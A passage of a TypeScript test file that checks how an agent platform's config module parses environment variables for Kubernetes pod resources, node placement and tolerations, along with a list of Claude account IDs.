  it("rejects k8s-pod without a session MCP URL", async () => {
    const { parseWorkRuntimeEnv } = await import("./config.js");
    expect(() => parseWorkRuntimeEnv({ CLAWS_WORK_BACKEND: "k8s-pod" }, { ...SESSION, mcpUrl: "" }))
      .toThrow("CLAWS_WORK_BACKEND=k8s-pod needs CLAWS_SESSION_MCP_URL");
    expect(parseWorkRuntimeEnv({}, { ...SESSION, mcpUrl: "" }).backend).toBe("in-process");
  });

  it("reads the agent pod resource overrides", async () => {
    const { parseWorkRuntimeEnv } = await import("./config.js");
    const { pod } = parseWorkRuntimeEnv({
      CLAWS_AGENT_POD_CPU_REQUEST: "1",
      CLAWS_AGENT_POD_MEMORY_REQUEST: "3Gi",
      CLAWS_AGENT_POD_MEMORY_LIMIT: "8Gi",
      CLAWS_AGENT_POD_EPHEMERAL_STORAGE_REQUEST: "6Gi",
      CLAWS_AGENT_POD_EPHEMERAL_STORAGE_LIMIT: "30Gi",
      CLAWS_AGENT_POD_HOME_SIZE: "25Gi",
    }, SESSION);
    expect(pod).toEqual({ cpuRequest: "1", memoryRequest: "3Gi", memoryLimit: "8Gi", ephemeralStorageRequest: "6Gi", ephemeralStorageLimit: "30Gi", homeSize: "25Gi", offNode: null });
  });

  it("leaves off-node placement unset when none of its variables is present", async () => {
    const { parseWorkRuntimeEnv } = await import("./config.js");
    expect(parseWorkRuntimeEnv({}, SESSION).pod.offNode).toBeNull();
    // Empty tolerations and hosts configure nothing.
    expect(parseWorkRuntimeEnv({ CLAWS_AGENT_POD_OFFNODE_TOLERATIONS: "", CLAWS_AGENT_POD_PREFERRED_NODES: " " }, SESSION).pod.offNode).toBeNull();
  });

  it("treats a present but empty off-node selector as replacing the session selector with none", async () => {
    const { parseWorkRuntimeEnv } = await import("./config.js");
    expect(parseWorkRuntimeEnv({ CLAWS_AGENT_POD_OFFNODE_SELECTOR: "" }, SESSION).pod.offNode).toEqual({ nodeSelector: {}, tolerations: [], preferredNodes: [] });
    expect(parseWorkRuntimeEnv({ CLAWS_AGENT_POD_OFFNODE_SELECTOR: "a=b, c = d" }, SESSION).pod.offNode?.nodeSelector).toEqual({ a: "b", c: "d" });
  });

  it("parses off-node tolerations and preferred nodes", async () => {
    const { parseWorkRuntimeEnv } = await import("./config.js");
    const { offNode } = parseWorkRuntimeEnv({
      CLAWS_AGENT_POD_OFFNODE_TOLERATIONS: "node-role.kubernetes.io/gpu=true:NoSchedule, node-role.kubernetes.io/storage:NoExecute",
      CLAWS_AGENT_POD_PREFERRED_NODES: "ryzen, k3s-nas",
    }, SESSION).pod;
    expect(offNode).toEqual({
      nodeSelector: null,
      tolerations: [
        { key: "node-role.kubernetes.io/gpu", operator: "Equal", value: "true", effect: "NoSchedule" },
        { key: "node-role.kubernetes.io/storage", operator: "Exists", effect: "NoExecute" },
      ],
      preferredNodes: ["ryzen", "k3s-nas"],
    });
  });

  it("fails config load on a malformed off-node entry", async () => {
    const { parseWorkRuntimeEnv } = await import("./config.js");
    expect(() => parseWorkRuntimeEnv({ CLAWS_AGENT_POD_OFFNODE_SELECTOR: "nokey" }, SESSION)).toThrow(/Invalid CLAWS_AGENT_POD_OFFNODE_SELECTOR entry "nokey"/);
    for (const bad of ["gpu=true", "gpu=true:Sometimes", ":NoSchedule", "=true:NoSchedule"]) {
      expect(() => parseWorkRuntimeEnv({ CLAWS_AGENT_POD_OFFNODE_TOLERATIONS: bad }, SESSION)).toThrow(/Invalid CLAWS_AGENT_POD_OFFNODE_TOLERATIONS entry/);
    }
    expect(() => parseWorkRuntimeEnv({ CLAWS_AGENT_POD_PREFERRED_NODES: "ryzen,bad host" }, SESSION)).toThrow(/Invalid CLAWS_AGENT_POD_PREFERRED_NODES entry "bad host"/);
  });
});

describe("parseClaudeAccounts", () => {
  it("defaults to one primary account", async () => {
    const { parseClaudeAccounts } = await import("./config.js");
    expect(parseClaudeAccounts(undefined, undefined)).toEqual([{ id: "primary", label: "primary" }]);
  });

  it("reads config.json accounts, defaulting each label to its id", async () => {
    const { parseClaudeAccounts } = await import("./config.js");
    expect(parseClaudeAccounts(undefined, [{ id: "main", label: "Main Max" }, { id: "second" }])).toEqual([
      { id: "main", label: "Main Max" },
      { id: "second", label: "second" },
    ]);
  });

  it("lets CLAWS_CLAUDE_ACCOUNTS win over config.json", async () => {
    const { parseClaudeAccounts } = await import("./config.js");
    expect(parseClaudeAccounts(" a , b-2 ", [{ id: "main" }]).map((a) => a.id)).toEqual(["a", "b-2"]);
  });

  it("drops invalid and duplicate ids, falling back to primary when none remain", async () => {
    const { parseClaudeAccounts } = await import("./config.js");
    expect(parseClaudeAccounts(undefined, [{ id: "Bad_Id" }, { id: "ok" }, { id: "ok" }, { id: "-lead" }]).map((a) => a.id)).toEqual(["ok"]);
    expect(parseClaudeAccounts("UPPER", undefined)).toEqual([{ id: "primary", label: "primary" }]);
  });
});
